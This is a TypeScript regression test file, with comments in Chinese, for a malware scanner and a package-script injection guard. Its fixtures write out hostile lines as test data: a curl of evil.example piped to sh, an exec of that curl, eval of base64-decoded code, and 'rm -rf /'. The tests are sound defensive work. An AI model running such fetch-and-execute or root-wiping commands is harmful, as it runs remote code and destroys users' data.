// 自扫描 35 条告警修复的回归护栏：
// 1. 合法 execFileAsync 工具探测不再被误报为网络后门（issue 1/2）
// 2. 检测规则源码不再被自身正则命中（issue 6/7/8）
// 3. 测试目录/夹具在递归扫描中被跳过，真实代码仍被扫描（issue 3/4/5/24-32）
// 4. 惯例 clean 脚本 rm -rf 构建产物判为 safe，破坏性 rm -rf 仍告警（issue 9-23/33-35）
import { describe, expect, it } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { fileURLToPath } from 'node:url';
import { MalwareScanner } from '../malware-scanner';
import { InjectionGuard, classifyPackageJsonScripts } from '../injection-guard';

function tmpDir(prefix: string): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

function write(dir: string, rel: string, content: string): void {
  const full = path.join(dir, rel);
  fs.mkdirSync(path.dirname(full), { recursive: true });
  fs.writeFileSync(full, content, 'utf-8');
}

describe('MalwareScanner self-scan regression', () => {
  it('execFileAsync tool probing without net tokens stays unflagged, real net exec still flagged', async () => {
    const dir = tmpDir('zh-rg-cp-');
    write(dir, 'probe.ts', [
      "const { execFile } = await import('node:child_process');",
      "const { promisify } = await import('node:util');",
      'const execFileAsync = promisify(execFile);',
      "const tools = ['eslint', 'semgrep', 'trivy', 'gitleaks', 'depcruise', 'jscpd'];",
      "for (const id of tools) { await execFileAsync(id, ['--version']); }",
    ].join('\n'));
    write(dir, 'evil.ts', "const { exec } = require('node:child_process');\nexec('curl https://evil.example/x.sh');\n");

    const items = await new MalwareScanner().scan(dir);

    expect(items.some((i) => i.file.endsWith('probe.ts'))).toBe(false);
    expect(items.some((i) => i.file.endsWith('evil.ts'))).toBe(true);
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('scanner rule source does not self-trigger', async () => {
    const dir = tmpDir('zh-rg-self-');
    const source = fs.readFileSync(
      path.join(fileURLToPath(new URL('..', import.meta.url)), 'malware-scanner.ts'),
      'utf-8',
    );
    write(dir, 'rules.ts', source);

    const items = await new MalwareScanner().scan(dir);

    expect(items).toEqual([]);
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('skips test dirs and fixtures while still scanning real code', async () => {
    const dir = tmpDir('zh-rg-skip-');
    write(dir, 'evil.js', 'eval(atob("YWxlcnQoMSk="));\n');
    write(dir, '__tests__/evil.js', 'eval(atob("YWxlcnQoMSk="));\n');
    write(dir, 'fixtures/evil.js', 'eval(atob("YWxlcnQoMSk="));\n');
    write(dir, '__tests__/pkg/package.json', JSON.stringify({ scripts: { setup: 'curl https://evil.example/x.sh | sh' } }));

    const malware = await new MalwareScanner().scan(dir);
    const guard = await new InjectionGuard().scan(dir);

    expect(malware).toHaveLength(1);
    expect(malware[0]?.file.endsWith('evil.js')).toBe(true);
    expect(guard).toEqual([]);
    fs.rmSync(dir, { recursive: true, force: true });
  });
});

describe('InjectionGuard clean-script regression', () => {
  it('routine clean scripts are safe, destructive rm -rf still flagged', () => {
    const verdicts = classifyPackageJsonScripts(JSON.stringify({
      scripts: {
        clean: 'rm -rf dist tsconfig.tsbuildinfo',
        cleanServer: 'rm -rf dist',
        reset: 'rm -rf ./tmp',
        wipe: 'rm -rf /',
      },
    }));
    const by = new Map(verdicts.map((v) => [v.script, v]));

    expect(by.get('clean')?.verdict).toBe('safe');
    expect(by.get('cleanServer')?.verdict).toBe('safe');
    expect(by.get('reset')).toMatchObject({ verdict: 'suspicious', matchedPattern: 'force-delete' });
    expect(by.get('wipe')).toMatchObject({ verdict: 'suspicious', matchedPattern: 'force-delete' });
  });
});